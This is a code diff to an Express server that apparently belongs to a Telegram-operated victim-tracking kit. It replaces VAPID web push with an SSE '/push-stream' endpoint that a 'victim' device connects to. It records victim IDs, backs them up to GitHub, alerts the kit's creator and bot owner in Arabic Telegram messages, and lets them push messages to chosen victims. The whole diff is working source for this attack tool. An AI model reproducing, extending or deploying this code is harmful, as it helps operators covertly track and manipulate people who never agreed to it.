@@ -1492,57 +1492,63 @@ app.get("/t.js", (req, res) => {
 })();`);
 });
 
-// ── Web Push: VAPID ────────────────────────────────────────────────────────────
+// ── Push Notifications: SSE-based (no FCM/VAPID needed) ───────────────────────
 const PUSH_FILE  = "./push_subs.json";
-let pushSubs = loadJSON(PUSH_FILE, {});   // { pid: { uid, subscription } }
+let pushSubs = loadJSON(PUSH_FILE, {});      // { pid: uid }
+const sseClients = {};                        // { pid: res }  — live connections
 
-// Serve VAPID public key to the frontend
-app.get("/vapid-key", (req, res) => res.json({ key: VAPID_PUBLIC }));
+// SSE stream: victim connects here, stays connected, receives push events
+app.get("/push-stream", (req, res) => {
+  const uid = req.query.uid || '';
+  const pid = req.query.pid || uid;
+  if (!pid) return res.status(400).end();
 
-// Push error reporting from client
-app.post("/push-error", (req, res) => {
-  res.send("ok");
-  const uid = req.body.uid || '';
-  const err = req.body.err || 'unknown';
-  if (!uid) return;
-  const tid = parseInt(uid, 36);
-  notify(tid, `⚠️ فشل اشتراك الإشعارات:\n${err}`);
-  if (tid !== BOT_OWNER) notify(BOT_OWNER, `⚠️ Push error — Creator: ${tid}\n${err}`);
-});
+  res.set({
+    "Content-Type":  "text/event-stream",
+    "Cache-Control": "no-cache",
+    "Connection":    "keep-alive",
+    "X-Accel-Buffering": "no"
+  });
+  res.flushHeaders();
+  res.write(": ok\n\n");
 
-app.post("/push-subscribe", (req, res) => {
-  res.send("ok");
-  const uid  = req.body.uid  || '';
-  const pid  = req.body.pid  || '';
-  const sub  = req.body.sub;
-  const key  = pid || uid;
-  if (!key || !sub || !sub.endpoint) return;
-  const isNew = !pushSubs[key];
-  pushSubs[key] = { uid, subscription: sub };
-  saveJSON(PUSH_FILE, pushSubs);
-  backupFileToGH("./push_subs.json", "_data/push_subs.json");
-  if (isNew) {
+  sseClients[pid] = res;
+
+  // Register pid in pushSubs if new
+  if (!pushSubs[pid]) {
+    pushSubs[pid] = uid;
+    saveJSON(PUSH_FILE, pushSubs);
+    backupFileToGH("./push_subs.json", "_data/push_subs.json");
     const tid = parseInt(uid, 36);
-    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم:\n/push ${key} النص`);
-    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${key}\n(Creator: ${tid})`);
+    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم:\n/push ${pid} النص`);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${pid}\n(Creator: ${tid})`);
   }
+
+  // Heartbeat every 25s to keep connection alive
+  const hb = setInterval(() => { try { res.write(": hb\n\n"); } catch(e) {} }, 25000);
+
+  req.on("close", () => {
+    clearInterval(hb);
+    if (sseClients[pid] === res) delete sseClients[pid];
+  });
 });
 
-async function sendPushToDevice(key, title, body) {
-  const entry = pushSubs[key];
-  if (!entry || !entry.subscription) return;
-  const payload = JSON.stringify({ title, body });
-  try {
-    await webPush.sendNotification(entry.subscription, payload);
-  } catch(e) {
-    if (e.statusCode === 410 || e.statusCode === 404) {
-      delete pushSubs[key];
-      saveJSON(PUSH_FILE, pushSubs);
-    }
+function sendPushToDevice(pid, title, body) {
+  const client = sseClients[pid];
+  if (client) {
+    try {
+      client.write(`event: push\ndata: ${JSON.stringify({ title, body })}\n\n`);
+      return;
+    } catch(e) { delete sseClients[pid]; }
+  }
+  // Fallback: re-notify via Telegram that device is offline
+  const entry = pushSubs[pid];
+  if (entry) {
+    const tid = parseInt(entry, 36) || parseInt(entry.uid || '', 36);
+    if (tid) notify(tid, `📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً`);
   }
 }
 
-// Legacy poll endpoint (kept for backward compat)
 app.get("/push-poll", (req, res) => res.json({}));
 
 // ── Persistent ID report ───────────────────────────────────────────────────────
